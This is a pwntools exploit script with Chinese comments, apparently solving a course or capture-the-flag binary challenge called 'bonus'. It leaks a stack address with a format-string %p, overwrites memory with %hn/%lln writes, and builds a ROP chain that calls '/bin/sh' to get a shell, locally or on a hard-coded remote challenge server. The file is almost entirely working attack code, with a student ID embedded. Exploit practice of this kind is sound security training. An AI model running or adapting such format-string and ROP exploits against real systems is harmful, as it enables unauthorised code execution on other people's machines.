from pwn import *

# 配置环境
context.arch = "amd64"
context.log_level = "debug"

# 远程与本地调试模式的选择
DEBUG = 1  # 本地调试
REMOTE = 0  # 远程测试

def ID_validation():
    p.sendlineafter(b"Please input your StudentID:\n", str(3220103784))

# 选择连接模式
if REMOTE:
    p = remote("8.154.20.109", 10302)
else:
    p = process("./bonus")

elf = ELF("./bonus")
libc = ELF("./libc.so")

# ID验证
if REMOTE:
    ID_validation()

# 设置偏移量等常量
offset_A = 8
offset_B = offset_A + (0x30 - 0x10) // 8
vuln_skip_push_rsp = 0x40126E
buffer = 0x4050A0
pop_rdi = 0x4011de

# 构造泄露地址的payload
payload = ""
payload += "%{}$p".format(offset_A)
payload = payload.encode().ljust(8, b"\x00")
p.sendline(payload)

if REMOTE:
    p.recvuntil(b"Here comes your challenge:\n")

# 计算stack_ptr_to_ret_addr
stack_ptr_to_ret_addr = eval(p.recv(14).decode()) - 0x20
stack_ptr_to_A = stack_ptr_to_ret_addr - 0x8

# 构造逐字节写入的payload
payload = "%c" * 6
payload += "%{}c%hn".format(stack_ptr_to_ret_addr % 0x10000 - 6)
payload += "%{}c%{}$lln".format(buffer + 0x40 - stack_ptr_to_ret_addr % 0x10000, offset_B)
payload = payload.encode().ljust(0x40, b"\x00")

# 构造ROP链
payload += b"A" * 8
payload += p64(pop_rdi)
payload += p64(buffer + 0x90)
payload += p64(vuln_skip_push_rsp)
payload = payload.ljust(0x90, b"\x00")
payload += b"/bin/sh\x00"

# 输出payload长度信息
p.info("payload length: {}".format(hex(len(payload))))

# 发送最终payload
p.sendline(payload)

# 进入交互模式，获取shell
p.interactive()
